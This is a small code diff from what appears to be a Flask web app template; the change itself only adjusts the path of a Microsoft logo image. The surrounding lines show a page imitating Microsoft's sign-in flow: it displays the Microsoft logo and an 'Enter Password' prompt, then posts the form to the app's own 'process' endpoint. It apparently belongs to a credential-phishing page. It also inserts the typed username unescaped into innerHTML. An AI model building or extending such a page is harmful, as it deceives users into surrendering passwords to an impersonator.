@@ -42,7 +42,7 @@
   
       if (usernameInput.value.trim() !== "") {
         container.innerHTML = `
-        <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt=""><p>Microsoft</p></div>
+        <div class="miclogo"><img src="images/microsoft_logo.png" alt=""><p>Microsoft</p></div>
         <div class="username-display" onclick="prevPage()"> ← ${usernameInput.value}</div>
         <div class="sign"><p>Enter Password</p></div>
         <form action="{{ url_for('process') }}" method="post">
